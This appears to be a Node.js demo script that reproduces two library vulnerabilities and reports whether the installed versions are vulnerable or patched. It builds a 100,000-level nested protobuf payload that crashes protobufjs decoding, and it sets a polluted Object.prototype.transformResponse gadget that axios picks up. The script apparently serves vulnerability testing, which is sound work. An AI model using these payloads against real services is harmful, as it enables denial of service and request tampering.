// Standalone demo that exercises both vulnerable packages for real,
// with no upstream services required.
//
//   node scripts/demo.js              -> normal happy-path encode/decode
//   node scripts/demo.js --cve-44289  -> trigger protobufjs recursion DoS
//   node scripts/demo.js --cve-44495  -> trigger axios prototype-pollution gadget

const protobuf = require("protobufjs");
const { encodeOrder, decodeOrder, loadOrderType } = require("../src/orderCodec");

async function happyPath() {
  const order = {
    orderId: "ORD-1001",
    customerId: "CUST-42",
    items: [
      { sku: "WIDGET-A", quantity: 3 },
      { sku: "WIDGET-B", quantity: 1 },
    ],
    shipping: { line1: "1 Market St", city: "SF", country: "US" },
  };
  const bytes = await encodeOrder(order);
  console.log(`encoded ${bytes.length} bytes of protobuf`);
  const decoded = await decodeOrder(bytes);
  console.log("decoded order:", JSON.stringify(decoded));
}

// CVE-2026-44289: build a deeply nested protobuf payload that makes
// protobufjs recurse until the call stack is exhausted on decode.
async function cve44289() {
  await loadOrderType();
  const Address = (await protobuf.load("proto/order.proto")).lookupType("orders.Address");

  // 100k nested `forward_to` addresses -> unbounded recursive decode.
  let nested = { line1: "leaf", city: "x", country: "US" };
  for (let i = 0; i < 100000; i++) {
    nested = { line1: "n" + i, city: "x", country: "US", forwardTo: nested };
  }
  const bytes = Buffer.from(Address.encode(Address.create(nested)).finish());
  console.log(`crafted ${bytes.length} bytes of deeply nested protobuf`);

  console.log("decoding (expect RangeError: Maximum call stack size exceeded)...");
  Address.decode(bytes); // <-- crashes here on vulnerable protobufjs
  console.log("decoded without error (you are on a patched protobufjs >= 7.5.6)");
}

// CVE-2026-44495: pollute Object.prototype.transformResponse, then let axios
// pick it up off an inherited config property while building a request.
async function cve44495() {
  const axios = require("axios");

  // Simulate prototype pollution that happened earlier in the pipeline
  // (e.g. via the /orders/config deepMerge with {"__proto__": {...}}).
  let gadgetFired = false;
  // eslint-disable-next-line no-extend-native
  Object.prototype.transformResponse = [
    function () {
      gadgetFired = true;
      console.log(">>> attacker-controlled transformResponse gadget executed <<<");
      return "pwned";
    },
  ];

  // Use a mock adapter so a response is always produced offline — this makes
  // the demo deterministic and exercises axios's response-transform pipeline,
  // which is where the inherited transformResponse gadget gets consumed.
  const adapter = (config) =>
    Promise.resolve({
      data: '{"lineTotal":42}',
      status: 200,
      statusText: "OK",
      headers: { "content-type": "application/json" },
      config,
      request: {},
    });

  let consumed = false;
  try {
    // The per-request config does NOT set transformResponse itself. On axios
    // < 1.15.2 the inherited Object.prototype.transformResponse is read off the
    // option-schema object during request config processing (assertOptions),
    // so axios mishandles the polluted value and the request blows up.
    const r = await axios.get("https://pricing.internal.example.com/v1/price", { adapter });
    console.log("request succeeded, data:", JSON.stringify(r.data));
  } catch (e) {
    consumed = e.message === "validator is not a function";
    console.log(`request threw: ${e.message}`);
  } finally {
    delete Object.prototype.transformResponse;
  }

  console.log(
    consumed || gadgetFired
      ? "VULNERABLE: axios consumed the inherited transformResponse off Object.prototype"
      : "patched: axios ignored the inherited prototype property (>= 1.15.2)"
  );
}

(async () => {
  const arg = process.argv[2];
  if (arg === "--cve-44289") return cve44289();
  if (arg === "--cve-44495") return cve44495();
  return happyPath();
})().catch((e) => {
  console.error(`${e.name}: ${e.message}`);
  process.exit(1);
});
